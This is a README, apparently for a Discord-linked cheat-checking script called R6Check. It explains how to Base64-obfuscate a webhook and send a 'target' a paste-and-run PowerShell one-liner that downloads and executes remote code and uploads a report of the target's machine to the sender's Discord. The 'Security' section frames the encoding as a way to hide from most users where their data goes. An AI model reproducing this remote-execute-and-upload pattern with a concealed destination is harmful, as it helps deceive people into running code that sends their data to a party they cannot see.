# Simple Obfuscated Webhook Solution

## How It Works

1. **You** encode your webhook using `encode-webhook.ps1`
2. **Get** an obfuscated hash (Base64 encoded)
3. **Send** the one-line command with the hash to the target user
4. **Script** automatically decodes and uses your webhook
5. **Reports** come to your Discord!



## 🔒 Security

**How Safe Is This?**

- ✅ **Casual users** won't see your webhook (looks like random text)
- ✅ **Easy to use** - No complicated setup
- ⚠️ **Advanced users** could decode Base64 (but most won't)
- ✅ **Better than plain text** in the command

**Best Practices:**

- ✅ Only send commands via **private DM** (not public channels)
- ✅ Rotate your webhook occasionally
- ✅ Use different webhooks for different groups
- ✅ Monitor your Discord for unexpected uploads



## 📝 Example Usage

**Your Side (One Time):**

```powershell
# 1. Run encoder
.\encode-webhook.ps1

# 2. Enter your webhook when prompted
https://discord.com/api/webhooks/987654321/xyz123abc

# 3. Copy the generated command
```

**Their Side (Each Time):**

```powershell
# They paste and run your command
irm https://raw.githubusercontent.com/dyvertigo/R6Check/main/R6Check.ps1 | iex; R6Check.ps1 -WebhookHash "ENCODED_HASH_HERE"

# Script downloads, runs, uploads to YOUR Discord
```



## 🎯 Complete Workflow

```
┌─────────────┐
│ You: Encode │  .\encode-webhook.ps1
│  Webhook    │  → Get hash: "aHR0cHM6..."
└──────┬──────┘
       │
       ▼
┌─────────────┐
│ You: Send   │  irm ... -WebhookHash "aHR0cHM6..."
│  Command    │  → Send to get access to target's logs
└──────┬──────┘
       │
       ▼
┌─────────────┐
│ Target: Runs│  Copy → Paste → Enter
│  Command    │  → Script downloads & runs
└──────┬──────┘
       │
       ▼
┌─────────────┐
│ Script:     │  Decodes hash → Gets webhook
│  Decode     │  → Runs scan → Uploads report
└──────┬──────┘
       │
       ▼
┌─────────────┐
│ You: Get    │  Report appears in YOUR Discord
│  Report     │  → Review for cheats
└─────────────┘
```



### **Update Webhook**

If you need to change your webhook:

1. Run `.\encode-webhook.ps1` again with new webhook
2. Get new hash
3. Send updated command to users

### **Verify Encoding**

To check what a hash decodes to:

```powershell
$hash = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzLzQ1Ng=="
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hash))
```

